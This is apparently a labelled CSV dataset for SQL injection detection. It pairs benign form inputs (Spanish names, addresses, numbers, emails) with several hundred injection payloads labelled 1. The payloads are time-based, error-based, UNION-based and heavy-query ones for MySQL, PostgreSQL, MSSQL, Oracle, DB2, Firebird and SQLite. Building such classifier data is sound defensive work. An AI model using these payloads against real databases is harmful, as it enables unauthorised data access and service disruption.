Query,Label
14962243f,0
lugar canedo s/n 13h,0
alfajarn,0
tabaquera,0
palidwor,0
.32l6152v0o,0
"1"") waitfor delay '0:0:5' and (""hhzy"" like ""hhzy",1
noblejas,0
fandio berzal,0
1' where 9816=9816 and 7533=7533--,1
overton,0
yoel,0
36668,0
6501,0
05192,0
3786004753545909,0
1' where 9544=9544;(select * from (select(sleep(5)))acdk)#,1
"1""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""fktl""=""fktl",1
giulivo padilla,0
1) as hlcn where 1165=1165 rlike (select * from (select(sleep(5)))vwyq)#,1
"c/ montereria, 146 4d",0
28614822q,0
"1) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",1
(case when 6398=6398 then 1 else null end),1
-6722') order by 1#,1
"-8491"" where 6107=6107 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",1
"1'||(select 'hbho' from dual where 7193=7193;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",1
21387,0
farran ferragut,0
0227003559920538,0
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",1
"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",1
raphael,0
28529,0
morrin,0
37ce,0
"-9958"") as jzvq where 3741=3741 union all select 3741,3741,3741#",1
"1"" where 7245=7245 and 9198=9198--",1
chabert,0
"1"") as eomu where 6599=6599;select * from generate_series(9167,9167,case when (9167=2273) then 1 else 0 end) limit 1--",1
dosrius,0
"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('asdc' like 'asdc",1
plebs cadevall,0
"1'||(select 'akye' where 9242=9242 union all select null,null,null,null,null,null#",1
"1%' or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
1) where 5025=5025;begin user_lock.sleep(5); end--,1
"1') where 6056=6056 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",1
meleskie,0
0992218178104844,0
7173,0
"-8410"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""xhzr""=""xhzr",1
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",1
cartagenero,0
40564971d,0
34081266g,0
1'+(select sijr where 7250=7250;if(1665=3845) select 1665 else drop function nzod--,1
inquisicin,0
"1%""))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((""%""=""",1
skaff@hipersevilla.nc,0
1' in boolean mode) or 4240=(select 4240 from pg_sleep(5))--,1
38623329g,0
5830397031097456,0
palmara@ajedrezconmaestros.museum,0
"1' and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
57757963h,0
bada gorina,0
1%' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and '%'=',1
"-4005' where 3963=3963 or elt(1032=1032,3623)--",1
"-8133') union all select 6417,6417,6417,6417,6417,6417,6417,6417--",1
druci,0
clorosis,0
"(select 1 from generate_series(8515,8515,case when (8515=3477) then 1 else 0 end) limit 1)",1
7427,0
herod3,0
-4323')) or 6968=1393,1
9791,0
"1%"" and (select * from (select(sleep(5)))fzno) and ""%""=""",1
"patio poeta luis rosales, 50 8f",0
"1';select * from generate_series(4465,4465,case when (4465=6232) then 1 else 0 end) limit 1--",1
"1%'))) union all select null,null,null,null#",1
d9str7par,0
8683,0
"-4515"") or elt(4545=2509,2509) and (""lglx""=""lglx",1
1')) waitfor delay '0:0:5'--,1
1;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
arce/artzi,0
faimunda,0
chascar,0
"1%'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",1
20914276p,0
08611,0
atletismo,0
"1)) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
praysner,0
"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""jcgh""=""jcgh",1
"1"") as kndn where 9314=9314;iif(6307=2459,1,1/0)",1
1 rlike sleep(5)#,1
mostazal,0
mame,0
monte9a,0
armstron,0
"pl. francisca pacheco, 81",0
s9p2212419435.5,0
hayes@players.com.sh,0
37662577p,0
hoya-gonzalo,0
abraham,0
"c/ de las gloxinias 91,",0
-3648' where 4629=4629 order by 1--,1
"1') as ljpy where 8270=8270 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
usma launes,0
datario,0
14ab214c6n,0
"1))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((1402=1402",1
emdid5,0
41309,0
t31331,0
"-3719"" union all select 6609,6609,6609,6609#",1
1') and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('bmhw' like 'bmhw,1
"-1305) or make_set(2298=5545,5545) and (6715=6715",1
"1%"") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (""%""=""",1
"1)) as fmpr where 3103=3103 and elt(9970=9297,9297)--",1
*694a47ndil,0
spain@erasmusrooms.bi,0
37150,0
"1' in boolean mode) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
1'));select case when 2095=9074 then 1 else null end--,1
-8074') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('lnwm'='lnwm,1
62123000t,0
27388,0
"-7923"")) or make_set(9354=9354,7185) and ((""szct""=""szct",1
6ilia+ria,0
1%';select pg_sleep(5) and '%'=',1
golari,0
59973244p,0
h9drog40i9a,0
tejo,0
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'yvzf'='yvzf",1
"1"")) union all select null,null,null,null,null,null,null#",1
amoeiro,0
heilig,0
8347221118078165,0
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)-- yekf",1
cassasola nochez,0
"-2601') union all select 2866,2866,2866,2866,2866,2866--",1
45479,0
44750,0
"1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('akyc'='akyc",1
rattenbury_roquette@ibizasounds.gh,0
46624,0
(select (case when (1570=6977) then 1 else 1570*(select 1570 from mysql.db) end)),1
-5962)) as jbqv where 2583=2583 or 7496=8560--,1
mclendon,0
buenavista,0
"1"" union all select null,null,null,null,null,null,null,null,null--",1
"1 where 2278=2278 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
barron,0
yaci,0
pimienta rosas,0
aun vilaregut,0
"-3169"" order by 1#",1
cubas de la sagra,0
"1' in boolean mode);select count(*) from generate_series(1,5000000)#",1
almazora/almassora,0
1'+(select 'dhcv' where 9372=9372;begin dbms_lock.sleep(5); end)+',1
revivificacin,0
"-8698"" where 1990=1990 or (8459=8459)*4906--",1
"1))) union all select null,null,null,null,null,null,null,null#",1
borsodi-heintje@unidadesdeventilacion.tg,0
yaonan,0
"1'+(select cjcp where 2590=2590 union all select null,null,null,null,null,null,null#",1
adriana,0
sanlcar la mayor,0
1'||(select 'bsbv' from dual where 5276=5276 or (select * from (select(sleep(5)))ydpu))||',1
1')) as qswu where 6377=6377;select case when 5433=6458 then 1 else null end--,1
lulio,0
25480,0
-3559') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),1
casaubn de rosa,0
1';(select * from (select(sleep(5)))srmq) and 'yfvu' like 'yfvu,1
522lta,0
satoh,0
c632i6ela,0
-5089')) as icbb where 1129=1129 or 6250=9650,1
"plaa zenobia camprubi, 81, 13-d",0
c/ tajonar 93 2e,0
c1s92be4e29,0
"1%""));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
melina,0
05296,0
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('szib' like 'szib",1
*ramonear,0
"1%' and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"-4586') as shdb where 6176=6176 union all select 6176,6176,6176,6176#",1
"1""));select benchmark(5000000,md5(0x4c4d6142)) and ((""vcvb"" like ""vcvb",1
"1""))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""ruvo"" like ""ruvo",1
ardavan,0
3764289357675438,0
1') waitfor delay '0:0:5'--,1
1')) or 6793=(select 6793 from pg_sleep(5)) and (('cqwz' like 'cqwz,1
turania,0
5092047047326643,0
"-4705' where 2029=2029 union all select 2029,2029,2029#",1
8,0
ballasko@quehaces.mr,0
aileen,0
"-8025"") or (1436=4186)*4186 and (""sqwv"" like ""sqwv",1
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'lxqz'='lxqz",1
"1%"") and 9198=9198--",1
-9673) or 8571=8571--,1
raiquen,0
1'))) and 5934=2309,1
4895228374639979,0
chui_alberti@faders.com.nc,0
86a7o,0
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'tqvy' like 'tqvy",1
45516,0
benito@mayoriasilenciosa.mu,0
0184493259280421,0
1') where 7537=7537 and 2006=2006,1
2892,0
-2751 where 6334=6334 or (9668=5845)*5845--,1
1477,0
thyssen.ferrell@somosagelespaa.bg,0
"1'+(select oogh where 1167=1167 or elt(5873=5873,sleep(5))#",1
"1) as estm where 4809=4809 union all select null,null,null--",1
1 where 8095=8095;select (case when (5152=7853) then 5152 else 5152*(select 5152 from mysql.db) end)#,1
1)) or sleep(5)#,1
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
1'||(select 'fven' where 1433=1433 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))||',1
05496401e,0
carpool,0
10161,0
1' where 2145=2145;select sleep(5)#,1
dev,0
ar2e5tad6,0
jetazo,0
condado de castilnovo,0
36432557m,0
mahecha barguo,0
"1')) as fusi where 2788=2788 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
abanear,0
soin,0
terrill,0
0113026243246153,0
"-6097%')) union all select 3990,3990,3990,3990,3990,3990--",1
sibila,0
sorzano,0
03331390r,0
esplendoroso,0
"-9011"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
cruselles varela,0
"1) where 2543=2543;iif(2205=4764,1,1/0)",1
1%'))) and (9404=8390)*8390 and ((('%'=',1
"1"" and 8635=(select count(*) from generate_series(1,5000000))--",1
"1"" where 2204=2204 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
cobea,0
1%' rlike (select * from (select(sleep(5)))sgvo) and '%'=',1
lani,0
berrocal de huebra,0
"glorieta farmaceutico perez jimenez 197,",0
1')) rlike (select (case when (6205=1384) then 1 else 0x28 end)) and (('ahjf'='ahjf,1
7173154653829351,0
de lagarza delacerda,0
1' in boolean mode) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#,1
3328,0
1166,0
chiriv herrador,0
-9553)) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((5299=5299,1
ashlin,0
0592934033194730,0
9173,0
6249,0
1')) as vwua where 8099=8099 union all select null--,1
1'))) rlike sleep(5) and ((('svuu'='svuu,1
roderick,0
"1"" or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
-3378')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('otbq'='otbq,1
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('jryo'='jryo,1
89208475p,0
44491,0
3064942409734995,0
4220,0
ru0i0en94?l,0
"1"")) as ftts where 3671=3671 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
6511294088626969,0
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('kqqf'='kqqf",1
"1""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""ugtw""=""ugtw",1
-2516) where 3349=3349 or 4855=1806--,1
"1"" where 4082=4082 and elt(5699=1432,1432)--",1
4033,0
koeman0,0
3o7za732,0
46120,0
041!da2131434e,0
"1'||(select 'ltqo' where 9080=9080 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",1
5586,0
7714749780417930,0
bendixsen9@foreignoffice.ps,0
pompilio,0
84411118z,0
gonska@estaestuweb.com.af,0
"c/ padilla, 74 12h",0
"-5198))) union all select 7089,7089,7089,7089,7089,7089,7089,7089#",1
ezequas,0
fornea,0
-3304')) order by 1--,1
51178304s,0
"1') where 6328=6328 union all select null,null,null,null,null,null,null,null,null#",1
abdala,0
"1"") or sleep(5)#",1
5408,0
eby@miplat.nl,0
michels,0
98411247c,0
9428064689399075,0
"1)) as ipfy where 1189=1189;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
d5sm7lad7,0
quek,0
4734,0
ling-yu,0
silvina,0
sripatimakul@forohh.ic,0
pittman,0
1%'))) rlike (select * from (select(sleep(5)))sgvo) and ((('%'=',1
sanderson@todobetis.ml,0
alazana,0
rumsey@ubikuo.coop,0
0197876956887475,0
paula pladellorens,0
san vicente de alcntara,0
0923146348088975,0
0212404020033772,0
3836034601398143,0
"1))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((1748=1748",1
"1%')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('%'='",1
1'));select sleep(5) and (('keoy'='keoy,1
81587818x,0
46208410f,0
tronchn,0
1006,0
"patio pico de aneto, 122 13-c",0
"-7448 union all select 4072,4072#",1
menju,0
-1876%') union all select 6463--,1
-5569') as cjaf where 3753=3753 union all select 3753#,1
mallejac,0
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('qhgp'='qhgp",1
46529,0
48042322z,0
"1"")) as vtad where 3653=3653 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
genciano,0
navalvillar de ibor,0
"-3007) where 6648=6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",1
"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",1
castellgal,0
aarn,0
22618043g,0
"1'))) and 8635=(select count(*) from generate_series(1,5000000))--",1
tufts3@joll.rs,0
brazzi@cortell.gs,0
01498780p,0
"-3930%"")) order by 1#",1
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('lwlh'='lwlh",1
9695488884758445,0
hattar4,0
f09$m3natriz,0
cosme,0
1' and 6969=(select 6969 from pg_sleep(5)) and 'dgvg'='dgvg,1
26143,0
beda,0
jaqueline,0
"1)) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
"1) where 5048=5048 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
"1%"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""%""=""",1
1zu67rado,0
calle juan valera 97 12d,0
3748ny,0
"avenida san francisco javier, 5,",0
sant andreu de la barca,0
"-2006')) union all select 7852,7852,7852,7852,7852--",1
1')));select (case when (9246=6326) then 9246 else 9246*(select 9246 from mysql.db) end)#,1
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'),1
"-5959"" or 2477=1144",1
02311,0
1') as lewd where 3118=3118 order by 1--,1
"1""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""frgb"" like ""frgb",1
"1""))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((""whld""=""whld",1
6105002331503043,0
21444030a,0
54,0
9173064367648056,0
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pnpx'='pnpx,1
1') where 8429=8429;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
1' in boolean mode) and 9198=9198--,1
"carrer castellfollit, s/n, 9-a",0
37607,0
"callejon giron 124,",0
young-ba,0
80029600l,0
0904159527442646,0
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('amjh'='amjh",1
"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('kqip' like 'kqip",1
2457099183182823,0
caf12n,0
44561,0
z218z11ri451,0
"c/ murillo, 106 5c",0
1'+(select 'toec' where 5810=5810 and sleep(5))+',1
"1'+(select jley where 3581=3581 and 2388=benchmark(5000000,md5(0x6d457153))#",1
"1') as hvyx where 3194=3194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
0446161008040688,0
h8ber,0
